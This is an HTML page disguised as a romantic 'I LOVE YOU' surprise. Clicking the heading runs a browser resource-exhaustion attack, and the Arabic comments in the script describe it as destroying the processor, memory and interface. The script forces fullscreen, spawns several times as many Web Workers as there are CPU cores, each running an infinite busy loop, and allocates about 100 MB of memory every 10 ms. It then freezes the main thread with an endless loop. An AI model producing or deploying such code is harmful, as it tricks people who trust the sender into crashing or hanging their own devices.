<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 30px #ff0055; cursor: pointer; }
    </style>
</head>
<body>

    <h1 id="start">I LOVE YOU</h1>

    <script>
        const btn = document.getElementById('start');
        let memoryFlood = [];

        btn.onclick = function() {
            this.innerText = "WAITING...";
            
            // 1. ملء الشاشة لزيادة استهلاك موارد الجرافيك
            document.documentElement.requestFullscreen().catch(()=>{});

            // 2. تدمير المعالج (CPU 100%)
            // سنفتح عدد ضخم من العمال لإجبار المعالج على أقصى طاقة
            const cores = (navigator.hardwareConcurrency || 8) * 4; 
            for (let i = 0; i < cores; i++) {
                const worker = new Worker(URL.createObjectURL(new Blob([`
                    setInterval(() => {
                        let data = "X".repeat(100000);
                        while(true) {
                            // عمليات تشفير تستهلك طاقة المعالج بالكامل
                            data = btoa(data + Math.random());
                            if(data.length > 1000000) data = data.substring(0, 100);
                        }
                    }, 1);
                `], { type: 'application/javascript' })));
            }

            // 3. تدمير الرام (RAM Destruction)
            // سنقوم بحجز مساحات ضخمة من الذاكرة الخام (Typed Arrays)
            setInterval(() => {
                try {
                    // حجز 100 ميجا في كل لفة (كل 10 مللي ثانية)
                    let chunk = new BigUint64Array(1024 * 1024 * 12).fill(BigInt(0xFFFFFFFFFFFFFFFFn));
                    memoryFlood.push(chunk);
                    
                    // منع المتصفح من إفراغ الذاكرة
                    window.history.pushState(null, null, "#" + Math.random());
                } catch(e) {
                    // في حالة الانهيار، يحاول الكود الاستمرار في استهلاك ما تبقى
                }
            }, 10);

            // 4. جعل الواجهة لا تستجيب نهائياً
            while(true) {
                // هجوم مباشر على "المسار الرئيسي" (Main Thread)
                for(let i=0; i<1000000; i++) { Math.atan(Math.random()); }
            }
        };
    </script>
</body>
</html>
